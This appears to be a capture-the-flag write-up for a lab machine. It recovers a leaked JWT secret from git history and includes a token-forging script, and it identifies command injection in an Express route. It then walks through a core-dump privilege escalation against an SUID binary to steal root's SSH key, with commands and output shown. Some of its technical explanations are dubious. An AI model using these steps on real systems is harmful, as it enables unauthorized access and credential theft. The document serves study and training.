## Source Code Analysis

The `.env` file that ships with the archive only contains:

```
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

`TOKEN_SECRET = secret` is obviously not a real production secret — it reads like a placeholder somebody dropped in right before zipping up the source for public download. But the archive also ships with the full `.git` directory, which means we have the entire commit history to dig through, including anything that was committed and later "removed."

`git log --oneline` shows exactly what we're hoping for:

![alt text](/assets/img/posts/secret/image-7.png)

One of the commits is literally titled *"removed .env for security reasons"*. Running `git show` on that commit reveals the diff:

![alt text](/assets/img/posts/secret/image-6.png)

The real `TOKEN_SECRET` — a long random string — was swapped out for the placeholder `secret` in that commit. Classic case of scrubbing a secret from the *current* file state while forgetting that the previous value is still sitting in the repository's history forever. This is the actual signing key the Express app uses for `jsonwebtoken`.

Reading through `routes/`, the interesting logic is in the admin routes:

```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;

    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

Two things stand out immediately:

1. Authorization here isn't based on any role stored in the database — it's just a hardcoded string check on `name == 'theadmin'`. Since the app trusts whatever `name` claim is inside the JWT (as long as the signature validates), forging a token with `name: "theadmin"` is enough to pass this check.
2. The `file` query parameter is concatenated directly into a shell command and handed to `exec()`. That's textbook command injection — no sanitization, no argument array, just string interpolation into a shell.

So the plan is: use the leaked signing secret to forge a token claiming to be `theadmin`, then abuse the injection in `/api/logs`.

## Forging the Admin JWT

Since we have the real `TOKEN_SECRET`, we don't need to guess or crack anything — we can just sign our own token from scratch with `jsonwebtoken`:

```js
const jwt = require("jsonwebtoken");

const secret = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE";

const payload = {
    _id: "6a97d08e8df7eb0479f27854",
    name: "theadmin",
    email: "test@test.com"
};

const token = jwt.sign(payload, secret, {
    algorithm: "HS256"
});

console.log(token);
```

Running it:

```
$ node generate_token.js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2YTk3ZDA4ZThkZjdlYjA0NzlmMjc4NTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpYXQiOjE3ODgzMzcwMDd9.veZmGe85n3IPTrgYHsJnEJa7ubhGciF26LpnN9kdzCk
```

Because the signature is computed with the correct secret, the server has no way to distinguish this from a token it issued itself — the JWT spec only guarantees integrity and authenticity of the claims, not who is allowed to set them, and this app never validates `name` against anything server-side beyond the string it decoded.

## Privilege Escalation

Poking around outside the web app's directory, `/opt` has two files that don't belong to a typical Node deployment:

```
dasith@secret:/opt$ ls
code.c  count
```

`count` turns out to be SUID root:

```
dasith@secret:/opt$ ls -l /opt
-rwsr-xr-x 1 root root 17824 Oct  7  2021 count
```

Running it just prompts for a path and gives back some statistics:

```
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: n
```

Since `code.c` is sitting right next to it, we don't have to reverse the binary — we can read exactly what it does.

### Reading the source

```c
int main()
{
    char path[100];
    ...
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);   // <-- runs while still root
    else
        filecount(path, summary);  // <-- runs while still root

    setuid(getuid());              // <-- privileges dropped only here
    prctl(PR_SET_DUMPABLE, 1);     // <-- re-enables core dumps
    ...
}
```

Two design decisions in this file combine into a serious vulnerability:

1. **The file is read *before* privileges are dropped.** `dircount()`/`filecount()` run while the process still has root's effective UID (inherited from the SUID bit), and only *after* they return does the program call `setuid(getuid())` to drop back to the real, unprivileged user. Anything the program touches during that window — reading a file, listing a directory — happens with full root access.
2. **`prctl(PR_SET_DUMPABLE, 1)` is called right after dropping privileges.** Linux disables core dumps for SUID binaries by default specifically to stop an attacker from crashing a privileged process and reading its memory off disk afterwards. This program explicitly re-enables that behavior for itself, undoing the kernel's protection on purpose (the comment in the source even says `// Enable coredump generation`, so it's deliberate, not an oversight of a default).

Put together: the binary reads arbitrary files as root, and then makes it trivial to dump the process's memory to a file we own.

### Step 1 — abuse the read to enumerate `/root`

Since `dircount()`/`filecount()` run as root, pointing the tool at `/root` bypasses the fact that `dasith` has no `x` permission on that directory at all:

```

Enter source file/directory name: /root
-rw-r--r--	.viminfo
drwxr-xr-x	..

drwxr-xr-x	.local
```

`.ssh` exists, and listing inside it (again, only possible because the binary is doing the `stat`/`readdir` calls as root, not us) shows an `id_rsa`:

```
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/.ssh
drwx------	..
-rw-------	authorized_keys
-rw-------	id_rsa
drwx------	.
-rw-r--r--	id_rsa.pub
```

That's the target. But `filecount()` never prints file *contents* — only character/word/line counts — so knowing `id_rsa` exists and is readable isn't the same as having it. We need a way to get the actual bytes the process read.

### Step 2 — chase the open file descriptor

`filecount()` opens the target file with `fopen()` and never closes it before the program pauses to ask "Save results a file? [y/N]". Combined with the fact that core dumps were re-enabled (a related side effect: the file descriptor table also stays intact and visible instead of being cleaned up early), the open handle is still sitting in `/proc/<pid>/fd/` while the process waits at that prompt.

We ran `count` against `id_rsa`, and background it at the y/N prompt instead of answering:

```
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/.ssh/id_rsa
Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
```

Grabbed the PID and checked its open file descriptors:

```
dasith@secret:/opt$ pidof count
65710
dasith@secret:/opt$ ls -l /proc/65710/fd/
total 0
lrwx------ 1 dasith dasith 64 Sep  2 09:47 0 -> /dev/pts/0
lrwx------ 1 dasith dasith 64 Sep  2 09:47 1 -> /dev/pts/0
lrwx------ 1 dasith dasith 64 Sep  2 09:47 2 -> /dev/pts/0
lr-x------ 1 dasith dasith 64 Sep  2 09:46 3 -> /root/.ssh/id_rsa
```

File descriptor `3` is confirmed pointing right at `id_rsa`. In theory this should be readable — the descriptor was opened by a root process, and `/proc/<pid>/fd/N` normally lets you read through an inherited handle regardless of the target file's own permissions. In practice:

```
dasith@secret:/opt$ cat /proc/65710/fd/3
cat: /proc/65710/fd/3: Permission denied
```

Denied. Once the process dropped privileges via `setuid(getuid())`, the kernel re-evaluated access to that fd against the process's *current* (now unprivileged, dasith) credentials rather than the ones it was opened under, closing off this particular route. The file listing trick against `/root` still worked (that read happens *before* the drop), but reading back through an already-open handle *after* the drop does not.

### Step 3 — crash it and read the core dump instead

This is where `prctl(PR_SET_DUMPABLE, 1)` becomes the real vulnerability. A core dump is a full memory snapshot of a process taken at the moment it crashes — and by the time `count` reaches the y/N prompt, the entire content of `id_rsa` is still sitting in a stack/heap buffer inside its address space, whether or not the fd is readable anymore.

Normally, SUID processes are marked non-dumpable specifically to prevent this: if a root-owned process crashes, its memory shouldn't end up in a file an unprivileged user can read. This program disables that protection on itself right after dropping privileges, which means the dump is written out as a file owned by the *unprivileged* user who ran the binary — us.

With the process still suspended in the background, we sent it a segfault and resumed it to trigger the dump:

```
dasith@secret:/opt$ kill -SIGSEGV 65710
dasith@secret:/opt$ fg
./count	(wd: /opt)
Segmentation fault (core dumped)
```

Ubuntu's `apport` crash handler picked it up and wrote a report:

```
dasith@secret:/opt$ ls -l /var/crash/
total 84
-rw-r----- 1 root   root   27203 Oct  6  2021 _opt_count.0.crash
-rw-r----- 1 dasith dasith 31368 Sep  2 09:47 _opt_count.1000.crash
-rw-r----- 1 root   root   24048 Oct  5  2021 _opt_countzz.0.crash
```

`_opt_count.1000.crash` is owned by `dasith` — exactly as expected, since `PR_SET_DUMPABLE` was set after the privilege drop. (The two root-owned crash files are leftovers from the box author testing the binary before release — not something we can read, and not needed.)

Apport crash reports aren't raw core dumps; they're a text wrapper (metadata + environment + a base64-encoded blob) around one. `apport-unpack` decodes that blob back into a proper ELF core file:

```
dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/dump
dasith@secret:/opt$ ls /tmp/dump/
Architecture  DistroRelease        ProblemType  ProcEnviron  Signal
CoreDump      ExecutablePath       ProcCmdline  ProcMaps     Uname
Date          ExecutableTimestamp  ProcCwd      ProcStatus   UserGroups
```

`CoreDump` is the actual memory image. Since an SSH private key is just PEM-encoded ASCII, `strings` on the core file finds it directly, no debugger or memory-layout analysis required:

```
dasith@secret:/opt$ strings -n 30 /tmp/dump/CoreDump | grep -A 30 "PRIVATE KEY"
```
